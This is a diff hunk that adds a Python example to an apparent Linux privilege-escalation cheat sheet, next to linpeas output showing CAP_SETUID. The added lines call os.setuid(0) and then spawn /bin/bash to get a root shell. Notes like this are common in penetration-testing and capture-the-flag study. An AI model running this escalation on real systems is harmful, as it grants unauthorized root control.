@@ -259,6 +259,14 @@ $ ./linpeas.sh
 CAP_SETUID
 ```
 
+- Python
+
+```
+>>> import os
+>>> os.setuid(0)
+>>> os.system("/bin/bash")
+```
+
 #5. - Brute Force
 -----------------------------------------
 
